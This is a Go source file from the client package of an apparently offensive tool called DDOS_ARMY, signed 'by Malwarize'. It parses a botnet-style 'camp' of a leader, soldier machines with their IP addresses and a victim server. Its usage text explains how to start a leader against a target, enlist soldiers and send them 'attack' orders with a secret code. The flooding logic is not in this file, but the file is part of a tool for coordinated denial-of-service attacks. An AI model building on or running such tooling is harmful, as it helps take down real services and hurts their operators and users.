package client

import (
	"DDOS_ARMY/camp"
	"fmt"
	"github.com/fatih/color"
	"os"
	"strings"
)

func MapToCampInfo(m map[string]interface{}) camp.Camp {

	// Cast the map to Camp
	c := camp.Camp{
		Leader: camp.Leader{
			Client: camp.Client{Name: m["Leader"].(map[string]interface{})["name"].(string)},
		},
		Soldiers:     make([]camp.Soldier, 0),
		VictimServer: m["VictimServer"].(string),
		Status:       strings.ToUpper(m["Status"].(string)),
	}
	if m["Soldiers"] == nil {
		return c
	}

	soldiers := m["Soldiers"].([]interface{})
	for _, soldier := range soldiers {
		s := camp.Soldier{
			Ip:     soldier.(map[string]interface{})["Ip"].(string),
			Client: camp.Client{Name: soldier.(map[string]interface{})["name"].(string)},
		}
		c.Soldiers = append(c.Soldiers, s)
	}
	return c
}

func PrintUsage() {
	progName := color.New(color.FgCyan, color.Bold).Sprintf(os.Args[0])
	usage := fmt.Sprintf(`Usage:
  %s server -l/--listen <host> -t/--target <target> [-n/--name <name>]
  %s client -c/--connect <host> [-n/--name <name>]
  %s order -c/--connect <host> -s/--secret <secret> (attack/a | stop/s | nothing/n)

Commands:
  %s: Starts the server to listen on a given host for a target
  %s: Connects to a given host as a soldier with an optional name
  %s: Sends an order to the given host with a secret authorization code

Options:
  %s, %s <host>    Host to listen on for the server command (default: 0.0.0.0)
  %s, %s <target>  Target IP address for the server command (mandatory)
  %s, %s <host>   Host to connect to for the client and order commands (mandatory)
  %s, %s <name>      Name of the leader for the server command or name of the soldier for the client command (default: %s for server and machine host name for client)
  %s, %s <secret>  Secret authorization code for the order command (mandatory)
  %s, %s             Show this message

Examples:
  %s server -l 0.0.0.0 -t target.com -n leaderName
  %s client -c 9.9.9.9 -n myName 
  %s order -c 9.9.9.9 -s secrectCode ATTACK`,
		progName, progName, progName,
		color.CyanString("server"), color.CyanString("client"), color.CyanString("order"),
		color.CyanString("-l, --listen"), color.CyanString("<host>"),
		color.CyanString("-t, --target"), color.CyanString("<target>"),
		color.CyanString("-c, --connect"), color.CyanString("<host>"),
		color.CyanString("-n, --name"), color.CyanString("<name>"), color.CyanString("#Sir Jeo"),
		color.CyanString("-s, --secret"), color.CyanString("<secret>"),
		color.CyanString("-h, --help"), color.CyanString("Show this message"),
		progName, progName, progName)

	fmt.Println(usage)
}
func PrintBanner() {
	b := "\n"
	b += ``
	b += color.MagentaString("  Ｄ")
	b += "ＤＯＳ"
	b += color.MagentaString(" Ａ")
	b += "ＲＭＹ"
	b += `
	⠀⠀⠀⠀⠀⠀⢀⣠⣴⣶⣶⣤⣤⣤⣤⣶⣶⣶⣶⣶⣶⣦⣤⣤⡀⠀⠀⣶⠀  	
	⢸⣿⣿⣿⣿⣿⣿⡿⢿⣿⡿⠟⢻⣿⣿⡟⠛⠛⠛⠉⠙⠛⠋⠀⠈⠉⠀⠈⠉⠁   
	⢸⣿⠿⠟⠋⠉⠀⢀⣾⡿⠉⠀⠈⠸⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠀⠀⠀⠹⣿⣷⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

`
	c :=
		`
 ☻__►╦╤─ https://discord.gg/g9y7D3xCab     
/▌
/ \
`
	// c to FgCyan
	c = color.CyanString(c)
	b += c
	b += color.MagentaString("  ⚡by Malwarize")
	b += "\n"
	//coloring the banner
	b = strings.Replace(b, "⢸", color.New(color.FgMagenta).Sprintf("⢸"), -1)
	b = strings.Replace(b, "⣿", color.New(color.FgBlue).Sprintf("⣿"), -1)
	b = strings.Replace(b, "⣶", color.New(color.FgMagenta).Sprintf("⣶"), -1)

	fmt.Println(b)
}

func GetHostName() string {
	hostname, err := os.Hostname()
	if err != nil {
		panic(err)
	}
	return hostname
}

func DisplayCampInfo(cp camp.Camp) {
	leader := cp.Leader.Client.Name
	soldiers := cp.Soldiers
	victimServer := cp.VictimServer
	status := cp.Status
	color.Yellow("Victim Server: " + victimServer)
	color.Green("Leader: " + leader)
	color.White("Soldiers: ")
	for _, soldier := range soldiers {
		color.Cyan("    " + soldier.Name + "  - " + soldier.Ip)
	}
	color.Yellow("Status: " + status)
}
